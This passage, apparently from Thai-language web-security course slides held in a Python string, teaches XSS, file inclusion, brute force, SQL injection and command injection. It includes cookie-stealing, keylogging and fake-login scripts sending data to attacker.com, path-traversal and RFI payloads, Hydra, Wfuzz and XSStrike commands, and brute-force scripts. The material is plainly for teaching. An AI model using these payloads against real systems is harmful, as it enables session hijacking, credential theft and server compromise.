<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #fbbf24;">&lt;input type="text" onfocus="alert('XSS')" autofocus&gt;</td>
<td style="padding: 10px;">การใช้ช่องกรอกข้อมูลที่จะทำการโฟกัสอัตโนมัติ (onfocus) เพื่อสั่งรันคำสั่งโดยผู้ใช้ไม่ต้องขยับเมาส์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #10b981;">&lt;body onload=alert('XSS')&gt;</td>
<td style="padding: 10px;">สั่งให้โค้ดประมวลผลทันทีที่ตัวเว็บและรายละเอียดในหน้าโหลดโครงสร้างเสร็จสิ้น</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08)">
<td style="padding: 10px; font-family: monospace; color: #10b981;">&lt;a href="javascript:alert('XSS')"&gt;Click me&lt;/a&gt;</td>
<td style="padding: 10px;">การฝังสคริปต์ไว้ในลิงก์เชื่อมโยง เพื่อหลอกล่อให้เหยื่อคลิกเข้ามาเรียกใช้งานคำสั่ง</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 146-150: XSS Scenario: Real-world Attacking Scenarios (ตัวอย่างภัยพิบัติที่แฮกเกอร์นำไปใช้จริง)

#### 🟢 1. การดักจับขโมยเซสชันคุกกี้ (Session Hijacking & Cookie Stealing)
สคริปต์สแกนหาข้อมูลคุกกี้สิทธิ์ของผู้ใช้เพื่อทำการแอบส่งออกไปยังเซิร์ฟเวอร์เก็บข้อมูลของแฮกเกอร์:
```html
<script>
    document.location='http://attacker.com/steal.php?cookie=' + document.cookie;
</script>
```

#### 🟢 2. การฝังสปายดักจับแป้นพิมพ์ป้อนข้อมูล (Keylogging Attack)
การลอบดักจับทุกการกดปุ่มของเหยื่อบนแป้นพิมพ์เพื่อขโมยรหัสผ่านหรือข้อมูลบัตรเครดิตขณะกรอกเว็บ:
```html
<script>
    document.onkeypress = function(e) {
        fetch('http://attacker.com/log.php?key=' + encodeURIComponent(e.key));
    };
</script>
```

#### 🟢 3. การสร้างแบบฟอร์มยืนยันตัวตนปลอมเพื่อตกเหยื่อ (Phishing Attack)
การเขียนสคริปต์ทับโครงสร้างหน้าเว็บปัจจุบันเพื่อวาดแบบฟอร์มขอรหัสผ่านส่งหาแฮกเกอร์:
```html
<script>
    document.body.innerHTML = '<h2>Session Expired. Please log in again.</h2>' +
      '<form action="http://attacker.com/collect.php" method="POST">' +
      'Username: <input type="text" name="user" required><br>' +
      'Password: <input type="password" name="pass" required><br>' +
      '<input type="submit" value="Login"></form>';
</script>
```

---

### 📄 SLIDE 151-160: Automated XSS Tool: XSStrike (เครื่องมือสแกนหา XSS อัจฉริยะ)
**XSStrike** คือเครื่องมือสแกนช่องโหว่ Cross-Site Scripting (XSS) ยอดนิยมระดับโลก พัฒนาขึ้นมาด้วยภาษา Python:
- มีความฉลาดลึกซึ้งกว่าเครื่องมือสแกนแบบสุ่มทั่วไป เนื่องจากจะทำการจำแนกและวิเคราะห์ความปลอดภัยในการตอบสนองของเว็บไซต์เป้าหมาย แล้วสุ่มพัฒนาสร้าง Payload เฉพาะขึ้นมาเจาะระบบเพื่อ bypass ระบบคัดกรองความปลอดภัย (WAF Bypass)
- **การติดตั้งเรียกใช้งาน**:
  ```bash
  # 1. โคลนคลังโค้ดจากกิตฮับมาเก็บลงระบบ
  git clone https://github.com/s0md3v/XSStrike.git
  
  # 2. ย้ายโฟลเดอร์เข้าไปยังสคริปต์เรียกใช้งาน
  cd XSStrike
  
  # 3. ติดตั้งไลบรารีอ้างอิงที่จำเป็นของระบบ
  pip3 install -r requirements.txt
  
  # 4. เรียกใช้งานเครื่องมือสแกน
  python3 xsstrike.py --help
  ```

#### 🛠️ ตารางสรุปออปชันคำสั่งของ XSStrike (Cheatsheet)
<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 10px; font-weight: bold; width: 180px;">คำสั่ง (Option)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">-u &lt;URL&gt;</td>
<td style="padding: 10px;">กำหนดลิงก์เว็บไซต์เป้าหมายที่ต้องการสแกนหา XSS (เช่น <code>-u "http://target.com/search.php?q=test"</code>)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--auto</td>
<td style="padding: 10px;">สั่งรันระบบประมวลผลและทดสอบยิงเจาะหาผลลัพธ์แบบอัตโนมัติทั้งหมด</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--params</td>
<td style="padding: 10px;">สแกนตรวจสอบพารามิเตอร์นำเข้าและฟิลด์ทั้งหมดที่มีอยู่จริงของหน้านั้น</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--fuzz</td>
<td style="padding: 10px;">รันโหมดสุ่มส่งโค้ดพิเศษ เพื่อตรวจสอบผลการประมวลผลสำหรับ WAF Bypass</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--file &lt;filepath&gt;</td>
<td style="padding: 10px;">สั่งสแกนตรวจสอบรายการเป้าหมายหลายพิกัดจากไฟล์บันทึกรายการรายชื่อลิงก์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--data "&lt;DATA&gt;"</td>
<td style="padding: 10px;">ทดสอบวิเคราะห์ช่องโหว่ความมั่นคงในรูปแบบข้อมูลที่ส่งผ่าน POST method</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--cookie "&lt;COOKIE&gt;"</td>
<td style="padding: 10px;">ส่งสวมคุกกี้สิทธิ์เซสชันของระบบเข้าไปเพื่อสแกนโซนล็อกอินหลังบ้าน</td>
</tr>
</tbody>
</table>
</div>

#### 🐚 ตัวอย่างรูปแบบคำสั่งการใช้งานจริงของ XSStrike
- **สแกนค้นหาเบื้องต้นของพารามิเตอร์**:
  `python3 xsstrike.py -u "http://target.com/search.php?q=test"`
- **สั่งสแกนเจาะระบบอัตโนมัติพร้อมเลือกคำตอบ Payload ให้อัตโนมัติ**:
  `python3 xsstrike.py --auto -u "http://target.com/search.php?q=test"`
- **รันตรวจสอบโหมดหลบเลี่ยงไฟร์วอลล์ (WAF Bypass Mode)**:
  `python3 xsstrike.py -u "http://target.com/search.php?q=" --fuzz`

---

### 📄 SLIDE 161-170: File Inclusion Attacks (ภัยคุกคามการเรียกเข้าใช้ไฟล์ระบบ)
**ช่องโหว่การนำเข้าไฟล์ระบบ (File Inclusion)** เกิดจากการที่โปรแกรมหรือภาษาหลังบ้านยอมรับพาธไฟล์ที่ผู้ใช้อินพุตมานำไปเรียกใช้งานฟังก์ชันดึงเนื้อหา (เช่น `include`, `require`, `file_get_contents` ใน PHP) โดยขาดการตรวจสอบสิทธิ์ความมั่นคงปลอดภัย
- **Local File Inclusion (LFI)**: แฮกเกอร์ใช้ช่องโหว่เพื่อขออ่านหรือประมวลผลไฟล์ภายใน **ระบบปฏิบัติการของเว็บเซิร์ฟเวอร์เอง** (เช่น ดึงไฟล์ `/etc/passwd` หรือล็อกของเครื่องแม่ข่าย)
- **Remote File Inclusion (RFI)**: แฮกเกอร์สามารถสั่งให้เซิร์ฟเวอร์ดึงเนื้อหาและประมวลผลสคริปต์แปลกปลอมที่เก็บไว้ใน **เครื่องเครือข่ายภายนอก (Remote Server)** ซึ่งมักก่อให้เกิดความเสี่ยงถูกแฮกควบคุมเครื่องเซิร์ฟเวอร์ได้อย่างง่ายดาย

#### 💻 ตัวอย่างโค้ดอันตรายเปรียบเทียบ LFI vs RFI (Vulnerable source comparison)
```php
// 🟢 ตัวอย่างช่องโหว่ Local File Inclusion (LFI)
<?php
    // แอปพลิเคชันนำชื่อไฟล์ในหน้าเพจไปแสดงผลตรงๆ
    include($_GET['page']);
?>
// หากแฮกเกอร์พิมพ์เรียก: page=../../../../etc/passwd ระบบจะอ่านข้อมูลรายชื่อบัญชีระบบออกมาแสดงทันที

// 🔵 ตัวอย่างช่องโหว่ Remote File Inclusion (RFI)
<?php
    // แอปนำค่าพาธที่เหยื่อกรอกไปเรียกใช้งาน
    include($_GET['file']);
?>
// หากแฮกเกอร์พิมพ์เรียก: file=http://attacker.com/malicious_shell.txt ระบบจะดึงโค้ดอันตรายภายนอกมาประมวลผล
```

---

### 📄 SLIDE 171-180: File Inclusion Attacks in Action (ตัวอย่างการใช้งานเพื่อตรวจสอบความปลอดภัย)

#### 🌐 1. การป้อนเรียกใช้งานผ่าน URL เพื่อเข้าถึงทรัพยากร
- **LFI - การขยับตำแหน่งข้ามโฟลเดอร์เพื่อดึงรายชื่อผู้ใช้ Linux**:
  `http://example.com/getFile?name=../../../etc/passwd`
- **LFI - การดึงข้อมูลล็อกเข้าใช้งาน Apache เพื่อทำการลอบฝัง Web Shell (Log Poisoning)**:
  `http://target.com/index.php?page=../../../../../../../var/log/apache2/access.log`
- **RFI - การสั่งประมวลผลโค้ดสคริปต์อันตรายข้ามเครือข่ายภายนอก**:
  `http://target.com/index.php?page=http://attacker.com/malicious_file.php`

#### 🐚 2. การสั่งยิงช่องโหว่ดึงไฟล์ระบบโดยใช้คำสั่ง cURL (POST-Based LFI)
```bash
curl -X POST -d "name=../../../etc/passwd" http://example.com/getFile
```

---

### 📄 SLIDE 181-190: File Inclusion Payload Cheatsheet (ตารางคีย์เจาะระบบนำเข้าไฟล์)
<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 10px; font-weight: bold; width: 60px;">ประเภท</th>
<th style="padding: 10px; font-weight: bold; width: 340px;">คีย์เจาะระบบ (Payload)</th>
<th style="padding: 10px; font-weight: bold;">ผลลัพธ์และคำอธิบาย (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #f43f5e;">../../../../etc/passwd</td>
<td style="padding: 10px;">ขยับตำแหน่งขึ้นไปอ่านไฟล์รายชื่อผู้ใช้ระบบปฏิบัติการ Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #f43f5e;">../../../../../../../boot.ini</td>
<td style="padding: 10px;">ดึงไฟล์โครงสร้างการบูตเปิดระบบปฏิบัติการ Windows</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #3b82f6;">php://input</td>
<td style="padding: 10px;">เรียกใช้อินพุตสตรีมของ PHP เพื่อป้อนประมวลผลโค้ดอันตรายผ่าน Request Body</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #3b82f6;">php://filter/convert.base64-encode/resource=index.php</td>
<td style="padding: 10px;">เรียกอ่านโค้ดต้นฉบับภาษา PHP (Source Code) โดยส่งออกมาในรูปแบบรหัส Base64 เพื่อเลี่ยงการรันประมวลผลไฟล์ซ้อน</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #fbbf24;">....//....//....//windows/system.ini</td>
<td style="padding: 10px;">บายพาสคีย์เวิร์ดการกรองคำว่า <code>../</code> แบบชั้นเดียว โดยการซ้อนรูปแบบอักขระ</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #fbbf24;">..\..\..\..\..\windows\win.ini</td>
<td style="padding: 10px;">ใช้เครื่องหมาย Backslash ขยับตำแหน่งไฟล์เพื่อเลี่ยงตัวกรองพารามิเตอร์แบบปกติ (Windows เท่านั้น)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #fbbf24;">%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd</td>
<td style="padding: 10px;">ใช้รหัสตัวอักษร URL-encoded (เช่น <code>%2e%2e%2f</code> แปลงมาจาก <code>../</code>) เพื่อเลี่ยงการจับความสัมพันธ์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08)">
<td style="padding: 10px; font-weight: bold; color: #10b981;">RFI</td>
<td style="padding: 10px; font-family: monospace; color: #ec4899;">http://attacker.com/mal_file.txt</td>
<td style="padding: 10px;">ดึงไฟล์สคริปต์ของแฮกเกอร์ข้ามโดเมนภายนอกเข้ามาประมวลผลบนเป้าหมาย</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 191-195: Brute Force Attacks (การเดาแบบรุนแรงเพื่อเข้าสู่ระบบ)
- **คำจำกัดความ**: Brute Force Attack คือกระบวนการลองสุ่มรหัสผ่านหรือข้อมูลยืนยันตัวตนแบบลองผิดลองถูกซ้ำๆ (Trial-and-Error) โดยระบบควบคุมอัตโนมัติหรือโปรแกรม เพื่อพยายามสุ่มเดาจนกว่าจะเจอข้อมูลที่ถูกต้อง
- **เป้าหมายหลัก**:
  - การแกะข้อมูลรหัสผ่านบัญชีทั่วไปและแอดมิน (Credential cracking)
  - เข้ายึดระบบหรือปลดล็อกขอบเขตข้อมูลที่ถูกเข้ารหัสไว้

#### 🛠️ สรุปประเภทการสุ่มเจาะเข้าสู่ระบบ (Brute Force Types)
<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 10px; font-weight: bold; width: 220px;">ประเภทการเดา (Attack Type)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #ffffff;">Simple Brute Force</td>
<td style="padding: 10px;">ใช้ตัวอักษรและตัวเลขประมวลผลทุกตัวอักษรที่สลับเป็นไปได้ทั้งหมด (เช่น aa1, aa2...)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-weight: bold; color: #ffffff;">Dictionary Attack</td>
<td style="padding: 10px;">สุ่มข้อมูลรหัสผ่านอ้างอิงจากคลังรายการรหัสผ่านยอดนิยมในอดีต (Wordlist/Dictionary)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #ffffff;">Hybrid Attack</td>
<td style="padding: 10px;">นำคำอ้างอิงจากพจนานุกรมมาเสริมแต่งตัวอักษรหรือตัวเลขต่อท้ายเพิ่มเติม (เช่น `password123`)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-weight: bold; color: #ffffff;">Credential Stuffing</td>
<td style="padding: 10px;">นำรายชื่อบัญชีและรหัสผ่านคู่ที่หลุดรั่วออกมาในสากลโลก (Data Breaches) มาทดลองเปิดใช้กับเป้าหมาย</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #ffffff;">Reverse Brute Force</td>
<td style="padding: 10px;">ใช้รหัสผ่านยอดฮิตค่าเดียว (เช่น <code>password123</code>, <code>123456</code>) ไล่ล็อกอินสุ่มกับชื่อบัญชีผู้ใช้หลายหมื่นรายชื่อ</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 196-200: Brute Force Tool: Hydra (โปรแกรมสุ่มล็อกอินความเร็วสูง)
**Hydra** คือหนึ่งในสุดยอดโปรแกรมรันสุ่มกุญแจความมั่นคงและบัญชีผ่านเครือข่ายบรรทัดคำสั่งที่รวดเร็วที่สุด:
- รองรับการสแกนผ่านหลายโปรโตคอลระบบ เช่น HTTP, SSH, FTP, Telnet, SMB เป็นต้น
- **รูปแบบคำสั่งการรันเดารหัสผ่านหน้าเว็บ**:

```bash
# 🟢 1. การเดาข้อมูลล็อกอินแบบส่งพารามิเตอร์ผ่าน GET Method
hydra -l admin -P /path/to/passwords.txt http-get://target.com/login.php

# 🔴 2. การเดาข้อมูลล็อกอินแบบส่งผ่านแบบฟอร์ม POST Form Method
hydra -l admin -P /path/to/passwords.txt http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid login"
```
- **ความหมายของสัญลักษณ์ควบคุม**:
  - `-l admin`: ระบุบัญชีเป้าหมายที่เจาะจงโจมตีเป็นชื่อ "admin"
  - `-P /path/to/passwords.txt`: แนบพาธคลังไฟล์รหัสผ่านที่เตรียมมาทดลองสุ่ม
  - `http-post-form`: กำหนดชนิดโปรโตคอลสำหรับการกรอกโพสต์ฟอร์มเว็บ
  - `^USER^` / `^PASS^`: ตัวแปรที่ระบบจะส่งรายชื่อและรหัสผ่านจากรายการเข้าไปแทนที่ทีละคำ
  - `F=Invalid login`: ประโยคแจ้งผลการล็อกอินล้มเหลว (Failure Message) ที่ปรากฏหน้าจอ เพื่อให้โปรแกรมแยกแยะได้ว่าคำตอบใดผิด

---

### 📄 SLIDE 201-203: Web Fuzzing by Wfuzz
**Wfuzz** คือเครื่องมือสแกนหาไดเรกทอรีและทดสอบยิงพารามิเตอร์ดิบผ่านเว็บเบราว์เซอร์ โดยจะนำอินพุตมาสลับสอดแทรกแทนที่ตำแหน่งคีย์เวิร์ดคำว่า `FUZZ`:
```bash
wfuzz -c -z file,/path/to/passwords.txt --hc 404 \
  http://target.com/login.php?username=admin&password=FUZZ
```
- **ความหมายออปชัน**:
  - `-c`: แสดงผลลัพธ์เป็นสีเพื่อให้อ่านข้อมูลล็อกอินได้ง่ายขึ้น
  - `-z file,...`: นำคลังไฟล์รหัสผ่านหรือเวิร์ดลิสต์มาใช้อ้างอิง
  - `--hc 404`: สั่งละเว้นการแสดงผลรหัสการขอเว็บที่เป็นความผิดพลาด 404 (Ignored Response Codes)

---

### 📄 SLIDE 204-207: Python Scripts for Web Brute Force (GET requests)
นอกเหนือจากการใช้โปรแกรมสำเร็จรูป นักพัฒนาและแฮกเกอร์มักเขียนสคริปต์ภาษา Python โดยใช้งานไลบรารี `requests` เพื่อประมวลผลเงื่อนไขการสุ่มหาแบบรวดเร็วและสามารถคัดกรองข้อมูลเองได้:

#### 🐍 1. ตัวอย่างสคริปต์สุ่มหาหน้าเว็บเพจที่ถูกซ่อนไว้ตามลำดับตัวเลข
```python
import requests

# ทำการรันวนลูปตัวเลขตั้งแต่ 1000 ถึง 9000 เพื่อสุ่มหาหน้าเว็บที่เปิดใช้งานจริง
for i in range(1000, 9000):
    url = 'http://172.19.19.129:8000/dakw/'
    link = url + 'room' + str(i) + '.html'
    
    # ส่งคำสั่งขอหน้าเว็บด้วย GET method
    web = requests.get(link)
    html = web.text
    
    # ตรวจสอบการโหลดหน้าเพจ หากไม่ปรากฏข้อความผิดพลาด ให้แสดง URL
    if 'Not Found' not in html:
        print("[FOUND] -> " + link)
```

#### 🐍 2. ตัวอย่างการสุ่มเลขที่ระบุจัดระเบียบเลขศูนย์นำหน้า (Zero-padded IDs)
```python
import requests

# รันลูปหาหน้าที่เก็บไฟล์ข้อมูล ID ลำดับที่ 6 ถึง 500
for i in range(6, 500):
    # สั่งจัดรูปแบบให้ตัวเลขมีความยาวเท่ากับ 5 หลักเสมอ เช่น 00006, 00007...
    link = 'http://172.19.19.129:8003/page/' + str(i).zfill(5)
    
    web = requests.get(link)
    html = web.text
    
    # หากไม่พบประโยคความผิดพลาด 404 แสดงว่าหน้าเอกสารมีความลับอยู่จริง
    if html.find('404 Not Found') == -1:
        print("[FOUND PADDING] -> " + link)
```

---

### 📄 SLIDE 208-210: Python Scripts for Web Brute Force (POST requests & Lottery)

#### 🐍 1. ตัวอย่างสคริปต์ส่งคำสั่งประมวลผลข้อมูลผ่าน POST requests
```python
import requests

for i in range(501, 10000):
    link = 'http://172.19.19.129:8003/new/'
    
    # เตรียมข้อมูลที่จัดรูปแบบเพื่อส่งไปโพสต์ลงฟอร์ม
    s = 'Test' + str(i).zfill(5)
    
    # ส่งชุดพารามิเตอร์แบบ POST request
    web = requests.post(link, { 'title': s, 'message': s })
    
    # ยิงทดสอบเช็คหน้าที่สร้างเสร็จสิ้นทันที
    link_page = 'http://172.19.19.129:8003/page/' + str(i).zfill(5)
    web_check = requests.get(link_page)
    html = web_check.text
    
    # ตรวจเช็คผลลัพธ์การจัดเก็บ
    if html.find('404 Not Found') >= 0:
        print("[COMPLETED POST VERIFY] -> " + link)
        break
```

#### 🐍 2. ตัวอย่างการเขียนสคริปต์ไขรหัสผ่าน/เลขอัตโนมัติ (Lottery / Digit Brute Force)
สคริปต์รันวนซ้อนแบบ nested loops เพื่อสุ่มเดาตัวเลข 3 หลัก (000 - 999) ในการส่งประเมินผล:
```python
import requests

def loop():
    # ลูปตัวเลขหลักที่หนึ่ง สอง และสามทีละค่า
    for a in range(10):
        for b in range(10):
            for c in range(10):
                # โพสต์ชุดตัวเลขที่สลับไปหาฟอร์มวิเคราะห์ผลลัพธ์หลังบ้าน
                web = requests.post('http://172.19.19.129:8000/ecxb/index.php',
                                    {'digit1': a, 'digit2': b, 'digit3': c})
                html = web.text
                
                # แสดงความคืบหน้าของตัวเลขปัจจุบันออกหน้าจอ
                print("[TESTING DIGIT] -> " + str(a) + str(b) + str(c))
                
                # หากเงื่อนไขในเว็บไม่ปรากฏข้อความล้มเหลว แสดงว่าเราทายเลขถูกต้อง
                if 'Unlucky Lottery' not in html:
                    print("[WINNER COMBINATION FOUND!] -> " + str(a) + str(b) + str(c))
                    return
loop()
```
"""
val179_1 = """### 💻 SQLi & Command Injection Lab Simulator (จำลองการแทรกคำสั่งประมวลผล)

คลิกหัวข้อด้านซ้ายมือเพื่อศึกษาช่องโหว่ และ **กดปุ่มรันจำลองการทำงานจริง (Run Simulation)** เพื่อดูผลการแทรกคำสั่ง:

<style type="text/css">
.w-sandbox-main { display: flex !important; gap: 20px !important; margin: 1.5rem auto !important; max-width: 1000px !important; }
.w-sandbox-nav { width: 220px !important; display: flex !important; flex-direction: column !important; gap: 8px !important; flex-shrink: 0 !important; }
.w-nav-item { background: rgba(255, 255, 255, 0.02) !important; border: 1px solid rgba(255, 255, 255, 0.06) !important; border-radius: 6px !important; padding: 10px 14px !important; color: #cbd5e1 !important; text-align: left !important; cursor: pointer !important; font-size: 0.78rem !important; transition: all 0.2s !important; }
.w-nav-item:hover, .w-nav-item.active { border-color: #3b82f6 !important; color: #ffffff !important; background: rgba(59, 130, 246, 0.05) !important; }
.w-nav-item.active { font-weight: 700 !important; box-shadow: 0 0 8px rgba(59, 130, 246, 0.15) !important; }
.w-sandbox-panels { flex-grow: 1 !important; display: flex !important; flex-direction: column !important; gap: 14px !important; }
.w-sand-panel { display: none; background: #05070f !important; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important; }
.w-sand-panel.active { display: block !important; }
</style>
<div class="w-sandbox-main" style="display: flex; gap: 20px; margin: 1.5rem auto; max-width: 1000px;">
<div class="w-sandbox-nav" style="width: 220px; display: flex; flex-direction: column; gap: 8px; flex-shrink: 0;">
<button id="nav-item-sqlitest" class="w-nav-item active" style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 6px; padding: 10px 14px; color: #cbd5e1; text-align: left; cursor: pointer; font-size: 0.78rem; transition: all 0.2s;" onclick="showSandboxItem('sqlitest', this)">1. UNION SQLi Test</button>
<button id="nav-item-cmdtest" class="w-nav-item" style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 6px; padding: 10px 14px; color: #cbd5e1; text-align: left; cursor: pointer; font-size: 0.78rem; transition: all 0.2s;" onclick="showSandboxItem('cmdtest', this)">2. OS Command Injection</button>
</div>
<div class="w-sandbox-panels" style="flex-grow: 1; display: flex; flex-direction: column; gap: 14px;">
<div id="panel-sqlitest" class="w-sand-panel active" style="background: #05070f; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important;">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>1. UNION-Based SQL Injection Simulation</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(59,130,246,0.08); border: 1px solid rgba(59,130,246,0.2); color: #3b82f6; font-family: monospace;">UNION SQLi</span>
</div>
<pre style="font-family: monospace; font-size: 0.8rem; color: #3b82f6; white-space: pre-wrap; margin: 0 0 12px; background: rgba(0,0,0,0.2); padding: 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">' UNION SELECT null, username, password FROM users --</pre>
<div style="background: #02040a; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 16px; overflow: hidden;">
<div style="background: rgba(255,255,255,0.03); padding: 6px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
<span style="font-size: 0.65rem; color: #64748b; font-weight: 800; letter-spacing: 0.06em; font-family: monospace;">🐚 Terminal Console</span>
<button style="background: rgba(59,130,246,0.1); border: 1px solid rgba(59,130,246,0.3); border-radius: 4px; color: #3b82f6; font-size: 0.68rem; padding: 3px 8px; cursor: pointer; font-family: monospace; font-weight: 700; transition: all 0.15s;" onclick="startWebSim('sqlitest')">▶ Run Simulation</button>
</div>
<div id="term-sqlitest" style="font-family: monospace; font-size: 0.76rem; color: #a7f3d0; padding: 12px 16px; white-space: pre-wrap; min-height: 90px;">
<span style="color: #3ddc84;">db-cli$</span> [กดปุ่ม Run Simulation เพื่อส่ง UNION payload]
</div>
</div>
<div style="background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 8px; padding: 16px; font-size: 0.83rem; color: #cbd5e1; line-height: 1.65;">
<h5 style="margin: 0 0 8px; font-size: 0.85rem; color: #fbbf24; font-weight: bold;">⚙️ Command Description</h5>
<p style="margin: 0;">คิวรีผสาน UNION SELECT ช่วยให้เราแอบไปดึงข้อมูลผู้ใช้งานและรหัสผ่านจากตารางอื่นออกมาทางเว็บบอร์ดแสดงผล</p>
</div>
</div>
<div id="panel-cmdtest" class="w-sand-panel" style="background: #05070f; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important; display: none;">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>2. OS Command Injection Bypass Space</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(59,130,246,0.08); border: 1px solid rgba(59,130,246,0.2); color: #3b82f6; font-family: monospace;">OS Command</span>
</div>
<pre style="font-family: monospace; font-size: 0.8rem; color: #3b82f6; white-space: pre-wrap; margin: 0 0 12px; background: rgba(0,0,0,0.2); padding: 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">cat${IFS}/etc/passwd</pre>
<div style="background: #02040a; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 16px; overflow: hidden;">
<div style="background: rgba(255,255,255,0.03); padding: 6px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
